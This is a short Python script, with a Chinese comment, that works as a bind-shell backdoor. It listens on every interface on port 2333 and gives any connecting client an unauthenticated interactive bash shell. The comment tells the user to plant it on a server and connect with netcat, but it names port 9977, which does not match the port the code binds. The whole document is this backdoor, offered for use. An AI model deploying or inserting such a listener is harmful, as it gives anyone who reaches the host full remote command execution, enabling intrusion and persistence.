###
###在服务器运行此脚本, 然后在自己的电脑上就可以直连 nc <your_ip> 9977
###
from socket import *
import subprocess
if __name__ == "__main__":
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(('0.0.0.0', 2333))
    server.listen(5)
    print ('waiting for connect')
    while 1:
        talk, addr = server.accept()
        print('connect from', addr)
        proc = subprocess.Popen(["python -c 'import pty; pty.spawn(\"/bin/bash\")'"],
                                stdin=talk,
                                stdout=talk,
                                stderr=talk,
                                shell=True)